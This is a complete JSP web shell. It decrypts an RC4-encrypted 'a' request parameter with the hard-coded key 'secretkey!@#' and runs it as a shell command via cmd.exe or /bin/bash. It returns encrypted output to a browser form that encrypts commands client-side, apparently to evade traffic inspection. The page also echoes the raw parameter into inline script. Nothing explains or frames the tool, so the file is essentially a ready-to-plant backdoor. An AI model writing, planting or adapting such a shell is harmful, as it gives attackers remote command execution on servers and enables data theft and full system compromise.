<%@ page import="java.io.*" %>

<%!

public static String getStringFromStackTrace(Throwable ex)
{
  if (ex==null)
  {
      return "";
  }
  StringWriter str = new StringWriter();
  PrintWriter writer = new PrintWriter(str);
  try
  {
      ex.printStackTrace(writer);
      return str.getBuffer().toString();
  }
  finally
  {
      try
      {
          str.close();
          writer.close();
      }
      catch (IOException e)
      {
          //ignore
      }
  }
}

public static class Base64
{
    public static String encode(byte[] data)
    {
        char[] tbl = {
            'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P',
            'Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f',
            'g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',
            'w','x','y','z','0','1','2','3','4','5','6','7','8','9','+','/' };

        StringBuilder buffer = new StringBuilder();
        int pad = 0;
        for (int i = 0; i < data.length; i += 3) {

            int b = ((data[i] & 0xFF) << 16) & 0xFFFFFF;
            if (i + 1 < data.length) {
                b |= (data[i+1] & 0xFF) << 8;
            } else {
                pad++;
            }
            if (i + 2 < data.length) {
                b |= (data[i+2] & 0xFF);
            } else {
                pad++;
            }

            for (int j = 0; j < 4 - pad; j++) {
                int c = (b & 0xFC0000) >> 18;
                buffer.append((char)tbl[c]);
                b <<= 6;
            }
        }
        for (int j = 0; j < pad; j++) {
            buffer.append((char)'=');
        }

        return buffer.toString();
    }

    public static byte[] decode(String data) throws UnsupportedEncodingException 
    {
        int[] tbl = {
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54,
            55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2,
            3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
            20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30,
            31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47,
            48, 49, 50, 51, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
            -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1 };
        byte[] bytes = data.getBytes();
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        for (int i = 0; i < bytes.length; ) {
            int b = 0;
            if (tbl[bytes[i]] != -1) {
                b = (tbl[bytes[i]] & 0xFF) << 18;
            }
            // skip unknown characters
            else {
                i++;
                continue;
            }

            int num = 0;
            if (i + 1 < bytes.length && tbl[bytes[i+1]] != -1) {
                b = b | ((tbl[bytes[i+1]] & 0xFF) << 12);
                num++;
            }
            if (i + 2 < bytes.length && tbl[bytes[i+2]] != -1) {
                b = b | ((tbl[bytes[i+2]] & 0xFF) << 6);
                num++;
            }
            if (i + 3 < bytes.length && tbl[bytes[i+3]] != -1) {
                b = b | (tbl[bytes[i+3]] & 0xFF);
                num++;
            }

            while (num > 0) {
                int c = (b & 0xFF0000) >> 16;
                buffer.write((char)c);
                b <<= 8;
                num--;
            }
            i += 4;
        }
        return buffer.toByteArray();
    }
}public static String RC4(String input, String key)
{
    StringBuilder result = new StringBuilder();
    int x, y, j = 0, i = 0;
    int[] s = new int[256];

    for (i = 0; i < 256; i++)
    {
        s[i] = i;
    }

    for (i = 0; i < 256; i++)
    {
        j = (key.charAt(i % key.length()) + s[i] + j) % 256;
        x = s[i];
        s[i] = s[j];
        s[j] = x;
    }
    j = 0;
    y = 0;
    for (i = 0; i < input.length(); i++)
    {
        y = (y + 1) % 256;
        j = (s[y] + j) % 256;
        x = s[y];
        s[y] = s[j];
        s[j] = x;

        result.append((char)(input.charAt(i) ^ s[(s[y] + s[j]) % 256]));
    }
    return result.toString();
}

public static String secret_key = "secretkey!@#";

public static String encrypt(String clearText) throws UnsupportedEncodingException {
    String encrypted_string = RC4(clearText, secret_key);
    byte[] utf8_bytes = encrypted_string.getBytes("UTF-8");
    return Base64.encode(utf8_bytes);
}

public static String decrypt(String cipherText) throws UnsupportedEncodingException {
    byte[] encrypted_bytes = Base64.decode(cipherText); // utf-8 byte array
    String encrypted_string = new String(encrypted_bytes, "UTF-8");
    String ret = RC4(encrypted_string, secret_key);
    return ret;
}


public static String execute(String cmd){
     String output = "";
    if(cmd != null) {
      String s = null;
      try {
         String[] command = null;
         if (System.getProperty("os.name").toLowerCase().indexOf("win") >= 0) // is windows
         {
            command = new String[]{"cmd.exe", "/c" , cmd};
         } else {
            command = new String[]{"/bin/bash", "-c", cmd};
         }
         Process p = Runtime.getRuntime().exec(command);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { 
            output += s + "\n"; 
         }
         BufferedReader sE = new BufferedReader(new InputStreamReader(p.getErrorStream()));
         while((s = sE.readLine()) != null){
        	 output += s + "\n";
         }
      }  catch(IOException e) {   
         output += getStringFromStackTrace(e);  
      }
   }
   return output;
}

%>


<%
if (request.getParameter("a") != null) {
    String cmd = request.getParameter("a");
    String output = execute(decrypt(cmd));
    //String output = execute(cmd);
    //out.write("<pre>" + output + "</pre>");
    String encrypted = encrypt(output);
    //String encrypted = output;
    //String decrypted = decrypt(encrypted);
    //out.write("decrypted: " + decrypted);
    out.write("<script>encrypted='" + encrypted + "';</script>");
}
%>
<html>
<head>
    <script>

        /*
        * RC4 symmetric cipher encryption/decryption
        *
        * @license Public Domain
        * @param string key - secret key for encryption/decryption
        * @param string str - string to be encrypted/decrypted
        * @return string
        */
        function rc4(key, str) {
            var res = '';
            var x, y, j = 0, i = 0;
            var s = [];
            for (i = 0; i < 256; i++) {
                s[i] = i;
            }
            for (i = 0; i < 256; i++) {
                j = (key.charCodeAt(i % key.length) + s[i] + j) % 256;
                x = s[i];
                s[i] = s[j];
                s[j] = x;
            }
            i = 0;
            j = 0;
            y = 0;
            for (i = 0; i < str.length; i++) {
                y = (y + 1) % 256;
                j = (s[y] + j) % 256;
                x = s[y];
                s[y] = s[j];
                s[j] = x;
                res += String.fromCharCode(str.charCodeAt(i) ^ s[(s[y] + s[j]) % 256]);
            }
            return res;
        }

        function encode_utf8(s) {
            return unescape(encodeURIComponent(s));
        }

        function decode_utf8(s) {
            return decodeURIComponent(escape(s));
        }

        key = "<%= secret_key%>";
        function encrypt(str) {
            var s = rc4(key, str);
            var encrypted_bytes = encode_utf8(s);
            return btoa(encrypted_bytes);
        }

        function decrypt(str) {
            var encrypted_bytes = atob(str)
            var s = decode_utf8(encrypted_bytes);
            return rc4(key, s);
        } 
    </script>
</head>
<body>
    <form id="form" method="post">
    <div><input type=text name="a" id="a" style="width: 900px" /></div>
    <div><input type="submit" name="submit" value="submit" /></div>
    <div><pre id="out"></pre></div>
    </form>
    <script>
        function callback() {
            var a = document.getElementById("a")
            a.value = encrypt(a.value);
            return true;
        }

        var ele = document.getElementById("form");
        if (ele.addEventListener) {
            ele.addEventListener("submit", callback, false);  //Modern browsers
        } else if (ele.attachEvent) {
            ele.attachEvent('onsubmit', callback);            //Old IE
        }

        // display output if exists
        if (typeof encrypted != 'undefined') {
            var a = '<%= request.getParameter("a") %>';
            document.getElementById("a").value = decrypt(a);
            document.getElementById("out").innerText = decrypt(encrypted);
        }
    </script>
</body>
</html>